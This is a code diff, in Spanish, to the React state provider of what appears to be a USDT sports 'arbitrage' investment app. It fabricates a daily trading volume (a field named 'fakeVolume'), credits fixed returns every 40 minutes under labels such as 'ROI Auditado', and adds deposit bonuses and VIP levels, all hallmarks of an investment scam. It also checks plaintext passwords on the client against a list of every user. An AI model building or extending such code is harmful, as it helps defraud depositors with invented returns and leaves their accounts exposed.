@@ -43,31 +43,36 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   const [isLoading, setIsLoading] = useState(true);
   const [notifications, setNotifications] = useState<Notification[]>([]);
 
-  // Función para obtener la hora exacta en República Dominicana (UTC-4)
   const getDRTime = () => {
-    return new Date(new Date().toLocaleString("en-US", { timeZone: "America/Santo_Domingo" }));
+    // Forzamos la obtención del tiempo en la zona de República Dominicana
+    const now = new Date();
+    const drOffset = -4; // UTC-4 para RD
+    const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+    return new Date(utc + (3600000 * drOffset));
   };
 
   const dailySports = useMemo(() => {
     const drTime = getDRTime();
-    // Ajuste de reset a las 11 AM RD: si es antes de las 11, usamos la semilla del día anterior
-    const effectiveDate = drTime.getHours() < 11 ? new Date(drTime.getTime() - 24 * 60 * 60 * 1000) : drTime;
+    // Si es antes de las 11:00 AM en RD, usamos la semilla del día anterior
+    const resetHour = 11;
+    const effectiveDate = drTime.getHours() < resetHour 
+      ? new Date(drTime.getTime() - (24 * 60 * 60 * 1000)) 
+      : drTime;
     
     const daySeed = effectiveDate.getFullYear() * 10000 + (effectiveDate.getMonth() + 1) * 100 + effectiveDate.getDate();
-    const priorityIndex = daySeed % SPORT_TEMPLATES.length;
     
     return SPORT_TEMPLATES.map((tpl, idx) => {
+      const isPriority = tpl.id === '2'; // MLB Baseball como prioridad de arbitraje
       const mIdx = (daySeed + idx) % (tpl.markets?.length || 1);
-      const market = tpl.markets ? tpl.markets[mIdx] : 'Marcador Inverso 3-3';
-      const isPriority = idx === priorityIndex;
+      const market = tpl.markets ? tpl.markets[mIdx] : 'Inverso 3-3';
 
       return {
         id: tpl.id,
         name: tpl.name, 
         icon: tpl.icon,
-        baseReturn: isPriority ? 0.025 : Math.max(0.011, Math.min(0.018, tpl.baseReturn + ((daySeed % 3) / 1000))),
+        baseReturn: isPriority ? 0.025 : Math.max(0.011, Math.min(0.018, tpl.baseReturn + ((daySeed % 5) / 1000))),
         color: tpl.color,
-        fakeVolume: `${(350 + (daySeed % 550))}K`,
+        fakeVolume: `${(450 + (daySeed % 400))}K`,
         market: market
       } as Sport;
     });
@@ -116,25 +121,24 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         
         setUser(prev => prev ? { ...prev, balance: newBalance, activeBet: null } : null);
 
-        await addTransactionForUser(user.id, {
-          type: 'earning',
-          amount: profit,
-          description: `ROI Auditado: ${user.activeBet.market}`
-        });
-
+        const newTx = { 
+          id: crypto.randomUUID(), 
+          userId: user.id, 
+          username: user.username, 
+          type: 'earning', 
+          amount: profit, 
+          date: new Date().toISOString(), 
+          status: 'completed',
+          description: `Arbitraje Finalizado: ${user.activeBet.market}`
+        };
+        
+        await supabase.from('transactions').insert([newTx]);
         await supabase.from('users').update({ balance: newBalance, activeBet: null }).eq('id', user.id);
-        showNotification(`¡Inversión Finalizada! +$${totalToReturn.toFixed(2)} USDT retornados.`, "success");
+        showNotification(`+$${totalToReturn.toFixed(2)} USDT Retornados a Balance.`, "success");
       }
-    }, 4000);
+    }, 5000);
     return () => clearInterval(interval);
   }, [user]);
-
-  const addTransactionForUser = async (userId: string, tx: any) => {
-    const target = allUsers.find(u => u.id === userId);
-    if (!target) return;
-    const newTx = { ...tx, id: crypto.randomUUID(), userId, username: target.username, date: new Date().toISOString(), status: 'completed' };
-    await supabase.from('transactions').insert([newTx]);
-  };
 
   const login = async (username: string, password?: string, isRegisterMode?: boolean, referredBy?: string) => {
     const usernameLower = username.toLowerCase().trim();
@@ -152,8 +156,8 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       return { success: true, message: "Registro exitoso." };
     } else {
       const found = allUsers.find(u => u.username === usernameLower);
-      if (!found || found.password !== password) return { success: false, message: "Error de credenciales." };
-      if (found.isBlocked) return { success: false, message: "Cuenta bloqueada." };
+      if (!found || found.password !== password) return { success: false, message: "Credenciales incorrectas." };
+      if (found.isBlocked) return { success: false, message: "Cuenta bloqueada por seguridad." };
       setUser(found);
       return { success: true, message: "Acceso autorizado." };
     }
@@ -165,7 +169,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     if (!user) return;
     const tx = { id: crypto.randomUUID(), userId: user.id, username: user.username, type: 'recharge', amount, status: 'pending', date: new Date().toISOString(), description: 'Depósito USDT', proofData };
     await supabase.from('transactions').insert([tx]);
-    showNotification("Notificación de pago enviada.", "success");
+    showNotification("Solicitud de depósito en revisión.", "success");
   };
 
   const withdraw = async (amount: number) => {
@@ -176,18 +180,21 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     const tx = { id: crypto.randomUUID(), userId: user.id, username: user.username, type: 'withdraw', amount, status: 'pending', date: new Date().toISOString(), description: 'Retiro Nexus', walletAddress: user.withdrawalAddress };
     await supabase.from('transactions').insert([tx]);
     await supabase.from('users').update({ balance: newBalance, monthlyWithdrawalCount: (user.monthlyWithdrawalCount || 0) + 1 }).eq('id', user.id);
-    return { success: true, message: "Solicitud de retiro enviada." };
+    return { success: true, message: "Solicitud enviada a auditoría." };
   };
 
   const applyCompoundInterest = async (amount: number, percent: number, sportId: string, market: string) => {
     if (!user || user.activeBet) return;
     const profit = (amount * percent) / 100;
-    const endTime = new Date(Date.now() + 2400000).toISOString();
+    const endTime = new Date(Date.now() + 2400000).toISOString(); // 40 minutos
     const activeBet: ActiveBet = { amount, sportId, startTime: new Date().toISOString(), endTime, potentialProfit: profit, market };
     const newBalance = user.balance - amount;
+    
+    const betTx = { id: crypto.randomUUID(), userId: user.id, username: user.username, type: 'bet', amount, status: 'completed', date: new Date().toISOString(), description: `Inversión Inversa: ${market}` };
+    
     setUser(prev => prev ? { ...prev, balance: newBalance, activeBet } : null);
     await supabase.from('users').update({ balance: newBalance, activeBet, lastBetDate: new Date().toISOString() }).eq('id', user.id);
-    await addTransactionForUser(user.id, { type: 'bet', amount, description: `Inversión Inversa: ${market}` });
+    await supabase.from('transactions').insert([betTx]);
   };
 
   const adminUpdateTransaction = async (id: string, status: 'completed' | 'rejected') => {
@@ -198,7 +205,8 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         const targetUser = allUsers.find(u => u.id === tx.userId);
         if (targetUser) {
           const isFirstRecharge = targetUser.totalRecharge === 0;
-          const isSaturday = new Date(tx.date).getDay() === 6;
+          const txDate = new Date(tx.date);
+          const isSaturday = txDate.getDay() === 6;
           
           let bonusAmount = isFirstRecharge ? tx.amount * FIRST_RECHARGE_BONUS : 0;
           let saturdayBonus = isSaturday ? tx.amount * SATURDAY_SUPER_RECHARGE_BONUS : 0;
@@ -220,17 +228,15 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
             vipLevel: newVIP 
           });
 
-          if (isSaturday) {
-            await addTransactionForUser(targetUser.id, {
-              type: 'bonus',
-              amount: saturdayBonus,
-              description: 'Bono Súper Recarga (Sábado)'
-            });
+          if (saturdayBonus > 0) {
+            await supabase.from('transactions').insert([{
+              id: crypto.randomUUID(), userId: targetUser.id, username: targetUser.username, type: 'bonus', amount: saturdayBonus, status: 'completed', date: new Date().toISOString(), description: 'Bono Súper Recarga Sábado'
+            }]);
           }
         }
       }
       await supabase.from('transactions').update({ status }).eq('id', id);
-      showNotification("Operación actualizada.", "success");
+      showNotification("Transacción procesada.", "success");
     } catch (err) { console.error(err); }
   };
 
@@ -262,9 +268,9 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       {children}
       <div className="fixed top-4 right-4 z-[9999] flex flex-col gap-2 pointer-events-none">
         {notifications.map((n) => (
-          <div key={n.id} className="pointer-events-auto backdrop-blur-md shadow-2xl rounded-2xl p-4 min-w-[280px] border-l-4 animate-in slide-in-from-right duration-300 flex items-start gap-3 bg-slate-900/90 border-amber-500 text-slate-100">
-            <div className="flex-1 text-xs font-bold">{n.message}</div>
-            <button onClick={() => removeNotification(n.id)} className="text-slate-500"><X size={16} /></button>
+          <div key={n.id} className="pointer-events-auto backdrop-blur-md shadow-2xl rounded-2xl p-4 min-w-[280px] border-l-4 animate-in slide-in-from-right duration-300 flex items-start gap-3 bg-slate-900/95 border-amber-500 text-slate-100">
+            <div className="flex-1 text-xs font-bold leading-tight">{n.message}</div>
+            <button onClick={() => removeNotification(n.id)} className="text-slate-500 hover:text-white"><X size={16} /></button>
           </div>
         ))}
       </div>
